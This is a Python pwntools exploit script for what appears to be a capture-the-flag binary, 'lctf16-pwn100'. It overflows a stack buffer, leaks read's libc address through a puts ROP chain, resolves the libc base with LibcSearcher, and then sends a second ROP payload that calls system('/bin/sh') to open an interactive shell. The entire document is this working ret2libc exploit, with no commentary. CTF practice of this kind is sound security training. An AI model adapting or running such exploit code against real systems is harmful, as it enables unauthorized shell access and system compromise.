from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

elf = ELF("./lctf16-pwn100")
#p = remote("111.200.241.244",35753)
p = process("./lctf16-pwn100")

read_got = elf.got['read']
put_addr = elf.plt['puts']

main_addr = 0x4006b8
pop_rdi = 0x400763


payload = "c" * 0x48 
payload += p64(pop_rdi)
payload += p64(read_got) 
payload += p64(put_addr)
payload += p64(main_addr)
payload = payload.ljust(0xc8,'e')

p.send(payload)

p.recvuntil("bye~\n")

addr = p.recv()[:6]+'\x00\x00'
addr = (u64(addr))
print(hex(addr))

obj = LibcSearcher("read",addr)
libc_base = addr - obj.dump('read')
system_addr = obj.dump("system") + libc_base
print("system:"+hex(system_addr))
binsh_addr = obj.dump("str_bin_sh") + libc_base
print("binsh_addr:"+hex(binsh_addr))

payload = "b" * 0x48 
payload += p64(pop_rdi)
payload += p64(binsh_addr) 
payload += p64(system_addr)
payload = payload.ljust(0xc8,'d')

p.send(payload)
p.interactive()
